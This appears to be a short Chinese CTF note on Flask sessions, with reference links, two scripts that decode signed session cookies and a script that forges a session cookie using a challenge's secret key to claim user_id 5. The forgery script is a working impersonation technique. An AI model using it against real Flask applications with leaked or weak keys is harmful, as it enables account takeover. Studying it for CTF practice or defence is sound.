参考：
- https://xz.aliyun.com/t/3569#toc-1
- https://cizixs.com/2017/03/08/flask-insight-session/
  
session解码脚本：
```python
from itsdangerous import *
s = "eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY"
data,timestamp,secret = s.split('.')
int.from_bytes(base64_decode(timestamp),byteorder='big')
```
  
decrypt2.py
```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```
  
session伪造脚本  
```python
from flask import Flask, session
app = Flask(__name__)

app.config['SECRET_KEY']='ichunqiuQAQ013'

@app.route('/flag')
def set_id():
    session['user_id']=5
    return "ok"

app.run(debug=True)
```